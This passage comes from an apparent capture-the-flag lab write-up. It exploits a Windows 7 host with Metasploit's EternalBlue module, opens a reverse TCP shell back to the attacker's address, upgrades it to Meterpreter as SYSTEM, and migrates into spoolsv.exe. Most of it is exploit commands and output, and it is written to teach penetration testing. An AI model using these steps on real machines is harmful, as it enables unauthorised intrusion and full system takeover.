+<a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>   LPORT     4444             yes       The listen port
+<a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>
+<a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>
+<a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>Exploit target:
+<a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>
+<a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>   Id  Name
+<a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a>   --  ----
+<a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a>   0   Automatic Target
+<a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a>
+<a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a>
+<a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a>
+<a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a>View the full module info with the info, or info -d command.
+<a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a>
+<a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 
+</code></pre></div>
+<p>Set the payload as reverse_tcp and run the exploit.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/shell/reverse_tcp
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>payload =&gt; windows/x64/shell/reverse_tcp
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>[*] Started reverse TCP handler on 10.2.4.35:4444 
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>[*] 10.10.234.217:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>[+] 10.10.234.217:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>[*] 10.10.234.217:445     - Scanned 1 of 1 hosts (100% complete)
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>[+] 10.10.234.217:445 - The target is vulnerable.
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>[*] 10.10.234.217:445 - Connecting to target for exploitation.
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>[+] 10.10.234.217:445 - Connection established for exploitation.
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>[+] 10.10.234.217:445 - Target OS selected valid for OS indicated by SMB reply
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>[*] 10.10.234.217:445 - CORE raw buffer dump (42 bytes)
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>[*] 10.10.234.217:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>[*] 10.10.234.217:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>[*] 10.10.234.217:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>[+] 10.10.234.217:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>[*] 10.10.234.217:445 - Trying exploit with 12 Groom Allocations.
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>[*] 10.10.234.217:445 - Sending all but last fragment of exploit packet
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>[*] 10.10.234.217:445 - Starting non-paged pool grooming
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>[+] 10.10.234.217:445 - Sending SMBv2 buffers
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>[+] 10.10.234.217:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>[*] 10.10.234.217:445 - Sending final SMBv2 buffers.
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>[*] 10.10.234.217:445 - Sending last fragment of exploit packet!
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>[*] 10.10.234.217:445 - Receiving response from exploit packet
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>[+] 10.10.234.217:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>[*] 10.10.234.217:445 - Sending egg to corrupted connection.
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>[*] 10.10.234.217:445 - Triggering free of corrupted buffer.
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>[*] Sending stage (336 bytes) to 10.10.234.217
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>[*] Command shell session 1 opened (10.2.4.35:4444 -&gt; 10.10.234.217:49230) at 2023-01-20 13:34:57 -0700
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>[+] 10.10.234.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+<a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>[+] 10.10.234.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+<a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a>[+] 10.10.234.217:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+<a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a>
+<a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a>
+<a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a>Shell Banner:
+<a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>Microsoft Windows [Version 6.1.7601]
+<a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a>-----
+<a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a>
+<a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a>
+<a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>C:\Windows\system32&gt;
+</code></pre></div>
+<p>Looks like we have an initial foothold.</p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>Background the current shell (<span class="keys"><kbd class="key-control">Ctrl</kbd><span>+</span><kbd class="key-z">Z</kbd></span>) and upgrade our shell to a Meterpreter shell.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show sessions
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Active sessions
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>===============
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>  Id  Name  Type               Information                               Connection
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>  --  ----  ----               -----------                               ----------
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>  2         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.2.4.35:4444 -&gt; 10.10.234.217:49242 (10
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>                                6.1.7601] -----                          .10.234.217)
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; search shell_to_meterpreter
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>Matching Modules
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>================
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>   #  Name                                    Disclosure Date  Rank    Check  Description
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>   -  ----                                    ---------------  ----    -----  -----------
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use 0
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>msf6 post(multi/manage/shell_to_meterpreter) &gt; show options
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>Module options (post/multi/manage/shell_to_meterpreter):
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>   Name     Current Setting  Required  Description
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>   ----     ---------------  --------  -----------
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>   LHOST                     no        IP of host that will receive the connection from the payload (Will try to a
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>                                       uto detect).
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>   LPORT    4433             yes       Port for payload to connect to.
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>   SESSION                   yes       The session to run this module on
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>
+<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>
+<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a>View the full module info with the info, or info -d command.
+<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a>
+<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a>msf6 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 2
+<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a>SESSION =&gt; 2
+<a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a>msf6 post(multi/manage/shell_to_meterpreter) &gt; show options
+<a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a>
+<a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a>Module options (post/multi/manage/shell_to_meterpreter):
+<a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a>
+<a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a>   Name     Current Setting  Required  Description
+<a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a>   ----     ---------------  --------  -----------
+<a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a>   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+<a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a>   LHOST                     no        IP of host that will receive the connection from the payload (Will try to a
+<a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a>                                       uto detect).
+<a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a>   LPORT    4433             yes       Port for payload to connect to.
+<a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a>   SESSION  2                yes       The session to run this module on
+<a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a>
+<a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a>
+<a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a>View the full module info with the info, or info -d command.
+<a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a>
+<a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a>msf6 post(multi/manage/shell_to_meterpreter) &gt; exploit
+<a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a>
+<a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a>[*] Upgrading session ID: 2
+<a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a>[*] Starting exploit/multi/handler
+<a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a>[*] Started reverse TCP handler on 10.2.4.35:4433 
+<a id="__codelineno-6-61" name="__codelineno-6-61" href="#__codelineno-6-61"></a>[*] Post module execution completed
+<a id="__codelineno-6-62" name="__codelineno-6-62" href="#__codelineno-6-62"></a>msf6 post(multi/manage/shell_to_meterpreter) &gt; 
+<a id="__codelineno-6-63" name="__codelineno-6-63" href="#__codelineno-6-63"></a>[*] Sending stage (200774 bytes) to 10.10.234.217
+<a id="__codelineno-6-64" name="__codelineno-6-64" href="#__codelineno-6-64"></a>[*] Meterpreter session 3 opened (10.2.4.35:4433 -&gt; 10.10.234.217:49249) at 2023-01-20 13:50:44 -0700
+<a id="__codelineno-6-65" name="__codelineno-6-65" href="#__codelineno-6-65"></a>[*] Stopping exploit/multi/handler
+<a id="__codelineno-6-66" name="__codelineno-6-66" href="#__codelineno-6-66"></a>
+<a id="__codelineno-6-67" name="__codelineno-6-67" href="#__codelineno-6-67"></a>msf6 post(multi/manage/shell_to_meterpreter) &gt; show sessions
+<a id="__codelineno-6-68" name="__codelineno-6-68" href="#__codelineno-6-68"></a>
+<a id="__codelineno-6-69" name="__codelineno-6-69" href="#__codelineno-6-69"></a>Active sessions
+<a id="__codelineno-6-70" name="__codelineno-6-70" href="#__codelineno-6-70"></a>===============
+<a id="__codelineno-6-71" name="__codelineno-6-71" href="#__codelineno-6-71"></a>
+<a id="__codelineno-6-72" name="__codelineno-6-72" href="#__codelineno-6-72"></a>  Id  Name  Type                     Information                            Connection
+<a id="__codelineno-6-73" name="__codelineno-6-73" href="#__codelineno-6-73"></a>  --  ----  ----                     -----------                            ----------
+<a id="__codelineno-6-74" name="__codelineno-6-74" href="#__codelineno-6-74"></a>  2         shell x64/windows        Shell Banner: Microsoft Windows [Vers  10.2.4.35:4444 -&gt; 10.10.234.217:49242
+<a id="__codelineno-6-75" name="__codelineno-6-75" href="#__codelineno-6-75"></a>                                     ion 6.1.7601] -----                    (10.10.234.217)
+<a id="__codelineno-6-76" name="__codelineno-6-76" href="#__codelineno-6-76"></a>  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC           10.2.4.35:4433 -&gt; 10.10.234.217:49249
+<a id="__codelineno-6-77" name="__codelineno-6-77" href="#__codelineno-6-77"></a>                                                                            (10.10.234.217)
+<a id="__codelineno-6-78" name="__codelineno-6-78" href="#__codelineno-6-78"></a>
+<a id="__codelineno-6-79" name="__codelineno-6-79" href="#__codelineno-6-79"></a>msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i -3
+<a id="__codelineno-6-80" name="__codelineno-6-80" href="#__codelineno-6-80"></a>[-] Invalid session identifier: -3
+<a id="__codelineno-6-81" name="__codelineno-6-81" href="#__codelineno-6-81"></a>msf6 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 3
+<a id="__codelineno-6-82" name="__codelineno-6-82" href="#__codelineno-6-82"></a>[*] Starting interaction with 3...
+<a id="__codelineno-6-83" name="__codelineno-6-83" href="#__codelineno-6-83"></a>
+<a id="__codelineno-6-84" name="__codelineno-6-84" href="#__codelineno-6-84"></a>meterpreter &gt; shell
+<a id="__codelineno-6-85" name="__codelineno-6-85" href="#__codelineno-6-85"></a>Process 2188 created.
+<a id="__codelineno-6-86" name="__codelineno-6-86" href="#__codelineno-6-86"></a>Channel 1 created.
+<a id="__codelineno-6-87" name="__codelineno-6-87" href="#__codelineno-6-87"></a>Microsoft Windows [Version 6.1.7601]
+<a id="__codelineno-6-88" name="__codelineno-6-88" href="#__codelineno-6-88"></a>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+<a id="__codelineno-6-89" name="__codelineno-6-89" href="#__codelineno-6-89"></a>
+<a id="__codelineno-6-90" name="__codelineno-6-90" href="#__codelineno-6-90"></a>C:\Windows\system32&gt;whoami
+<a id="__codelineno-6-91" name="__codelineno-6-91" href="#__codelineno-6-91"></a>whoami
+<a id="__codelineno-6-92" name="__codelineno-6-92" href="#__codelineno-6-92"></a>nt authority\system
+<a id="__codelineno-6-93" name="__codelineno-6-93" href="#__codelineno-6-93"></a>
+<a id="__codelineno-6-94" name="__codelineno-6-94" href="#__codelineno-6-94"></a>C:\Windows\system32&gt;
+</code></pre></div>
+<p>Looks like we are NT AUTHORITY\SYSTEM.</p>
+<p>List the running processes using the <code>ps</code> command.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>C:\Windows\system32&gt;exit
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>exit
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>meterpreter &gt; ps
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>Process List
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>============
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a> PID   PPID  Name                Arch  Session  User                          Path
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a> ---   ----  ----                ----  -------  ----                          ----
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a> 0     0     [System Process]
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a> 4     0     System              x64   0
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a> 416   4     smss.exe            x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a> 428   712   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a> 488   712   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a> 564   556   csrss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a> 612   556   wininit.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a> 624   604   csrss.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a> 664   604   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a> 712   612   services.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a> 720   612   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a> 728   612   lsm.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a> 836   712   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a> 904   712   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a> 952   712   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
+<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a> 1020  664   LogonUI.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a> 1088  712   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
+<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a> 1160  2924  cmd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
+<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a> 1192  712   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
+<a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a> 1352  712   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
+<a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a> 1416  712   amazon-ssm-agent.e  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-s
+<a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>             xe                                                               sm-agent.exe
+<a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a> 1488  712   LiteAgent.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\Lit
+<a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a>                                                                              eAgent.exe
+<a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a> 1628  712   Ec2Config.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigSer
+<a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>                                                                              vice\Ec2Config.exe
+<a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a> 1932  712   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
+<a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a> 2068  712   TrustedInstaller.e  x64   0        NT AUTHORITY\SYSTEM
+<a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a>             xe
+<a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a> 2080  836   WmiPrvSE.exe
+<a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a> 2200  564   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+<a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a> 2256  712   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE
+<a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a> 2380  564   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+<a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a> 2444  712   sppsvc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
+<a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a> 2592  712   vds.exe             x64   0        NT AUTHORITY\SYSTEM
+<a id="__codelineno-7-45" name="__codelineno-7-45" href="#__codelineno-7-45"></a> 2684  712   svchost.exe         x64   0        NT AUTHORITY\SYSTEM
+<a id="__codelineno-7-46" name="__codelineno-7-46" href="#__codelineno-7-46"></a> 2736  712   SearchIndexer.exe   x64   0        NT AUTHORITY\SYSTEM
+<a id="__codelineno-7-47" name="__codelineno-7-47" href="#__codelineno-7-47"></a> 2876  2400  powershell.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShel
+<a id="__codelineno-7-48" name="__codelineno-7-48" href="#__codelineno-7-48"></a>                                                                              l\v1.0\powershell.exe
+<a id="__codelineno-7-49" name="__codelineno-7-49" href="#__codelineno-7-49"></a> 2924  712   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+<a id="__codelineno-7-50" name="__codelineno-7-50" href="#__codelineno-7-50"></a>
+<a id="__codelineno-7-51" name="__codelineno-7-51" href="#__codelineno-7-51"></a>meterpreter &gt;
+</code></pre></div>
+<p>Let's migrate to PID 2924 (spoolsv.exe)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>meterpreter &gt; migrate 2924
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>[*] Migrating from 2876 to 2924...
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998: warning: Exception in finalizer #&lt;Proc:0x00007f099d3d08d0 /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339&gt;
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>/usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `synchronize&#39;: can&#39;t be called from trap context (ThreadError)
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:147:in `send_packet&#39;
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response&#39;
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request&#39;
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:362:in `close&#39;
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:339:in `block in finalize&#39;
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `chr&#39;
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:998:in `block in xor_bytes&#39;
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet.rb:997:in `each_byte&#39;
